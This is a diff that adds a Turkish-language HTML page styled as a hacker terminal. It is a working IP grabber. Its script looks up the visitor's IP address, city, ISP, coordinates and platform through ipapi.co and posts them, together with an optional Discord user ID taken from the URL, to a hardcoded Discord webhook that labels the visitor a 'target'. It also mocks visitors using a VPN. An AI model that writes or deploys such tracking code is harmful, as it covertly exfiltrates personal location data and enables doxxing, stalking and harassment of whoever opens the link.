@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome Qeat'S World</title>
+    <style>
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { width: 90%; max-width: 700px; background: rgba(0, 0, 0, 0.95); border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); position: relative; }
+        .line { margin-bottom: 12px; font-size: 14px; white-space: nowrap; overflow: hidden; border-right: .15em solid orange; width: 0; }
+        .type-1 { animation: typing 1s steps(40, end) forwards 0.5s, blink-caret .75s step-end infinite; }
+        .type-2 { animation: typing 1s steps(40, end) forwards 1.8s, blink-caret .75s step-end infinite; }
+        .type-3 { animation: typing 1s steps(40, end) forwards 3.1s, blink-caret .75s step-end infinite; }
+        @keyframes typing { from { width: 0 } to { width: 100% } }
+        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #00ff41; } }
+        .progress-container { width: 100%; background-color: #111; margin: 20px 0; display: none; }
+        .progress-bar { width: 0%; height: 4px; background-color: #00ff41; box-shadow: 0 0 10px #00ff41; }
+        #result-box { margin-top: 25px; display: none; border-top: 1px solid #333; padding-top: 15px; }
+        .map-frame { width: 100%; height: 220px; margin-top: 15px; border: 1px solid #444; filter: grayscale(1) invert(1) contrast(1.2); }
+        .vpn-alert { color: #ffcc00; font-weight: bold; margin-bottom: 15px; border: 1px dashed #ffcc00; padding: 8px; text-align: center; font-size: 14px; }
+        .data-row { display: flex; justify-content: flex-start; margin-bottom: 5px; }
+        .label { color: #888; width: 120px; }
+        .value { color: #ff0000; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="terminal">
+    <div class="line type-1">>Bir DAkika Bekleyin...</div>
+    <div class="line type-2">> Çok Az Kaldı</div>
+    <div class="line type-3">> Açılıyor!</div>
+    
+    <div class="progress-container" id="loader">
+        <div class="progress-bar" id="bar"></div>
+    </div>
+
+    <div id="result-box">
+        <div id="vpn-msg"></div>
+        <div class="data-row"><span class="label">> IP ADRESİ:</span> <span class="value" id="user-ip">...</span></div>
+        <div class="data-row"><span class="label">> LOKASYON:</span> <span class="value" id="user-loc">...</span></div>
+        <div class="data-row"><span class="label">> SAĞLAYICI:</span> <span class="value" id="user-isp">...</span></div>
+        <div class="data-row"><span class="label">> SİSTEM:</span> <span class="value" id="user-sys">...</span></div>
+        <iframe id="gmap" class="map-frame" frameborder="0" scrolling="no"></iframe>
+        <div style="margin-top: 15px; font-size: 10px; color: #444; text-align: center;">Kayıt No: #<span id="reg-no"></span> | VERİLER SİSTEME İŞLENDİ.</div>
+    </div>
+</div>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
+
+    // --- YENİ KOD ---
+    // Tarayıcının adres çubuğundaki URL'den parametreleri okumak için kullanılır.
+    const urlParams = new URLSearchParams(window.location.search);
+    // 'uid' parametresini (yani Discord kullanıcı ID'sini) alır.
+    const discordUserID = urlParams.get('uid');
+
+    setTimeout(() => {
+        document.getElementById('loader').style.display = 'block';
+        let bar = document.getElementById('bar');
+        let width = 0;
+        let interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval);
+                finalizeDiscovery();
+            } else {
+                width++;
+                bar.style.width = width + '%';
+            }
+        }, 25);
+    }, 4500);
+
+    function finalizeDiscovery() {
+        fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            const isVPN = data.country_code !== 'TR';
+            const device = navigator.platform;
+            const regNo = Math.floor(Math.random() * 89999) + 10000;
+            document.getElementById('reg-no').innerText = regNo;
+
+            document.getElementById('user-ip').innerText = data.ip;
+            document.getElementById('user-loc').innerText = `${data.city} / ${data.country_name}`;
+            document.getElementById('user-isp').innerText = data.org;
+            document.getElementById('user-sys').innerText = device;
+            
+            if(isVPN) {
+                document.getElementById('vpn-msg').innerHTML = `<div class="vpn-alert">HAHA, VPN AÇMAN KOMİK OLMUŞ :)</div>`;
+            }
+
+            const mapUrl = `https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=14&output=embed`;
+            document.getElementById('gmap').src = mapUrl;
+            document.getElementById('result-box').style.display = 'block';
+
+            // --- GÜNCELLENMİŞ KOD ---
+            // Webhook'a gönderilecek alanları bir dizi olarak oluşturur.
+            const embedFields = [
+                { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
+                { name: "📍 Lokasyon", value: `\`${data.city} / ${data.country_name}\``, inline: true },
+                { name: "📡 ISS", value: `\`${data.org}\``, inline: false },
+                { name: "💻 Sistem Bilgisi", value: `\`${device}\``, inline: true }
+            ];
+
+            // Eğer URL'de bir Discord ID'si varsa, bunu da alanlara ekler.
+            if (discordUserID) {
+                embedFields.push({ name: "👤 Discord ID", value: `\`${discordUserID}\` (<@${discordUserID}>)`, inline: false });
+            }
+
+            // Discord'a Gönder
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "TEŞKİLAT SORGULAMA MERKEZİ",
+                    embeds: [{
+                        title: isVPN ? "🕵️ HEDEF VPN ARKASINA SAKLANIYOR" : "🎯 HEDEF NET LOKASYONDA",
+                        color: isVPN ? 16763904 : 16711680,
+                        fields: embedFields, // Diziyi burada kullanır.
+                        image: { url: `https://static-maps.yandex.ru/1.x/?lang=en_US&ll=${data.longitude},${data.latitude}&z=12&l=map&size=450,250` },
+                        footer: { text: "Kayıt No: #" + regNo },
+                        timestamp: new Date()
+                    }]
+                })
+            });
+        });
+    }
+</script>
+
+</body>
+</html>
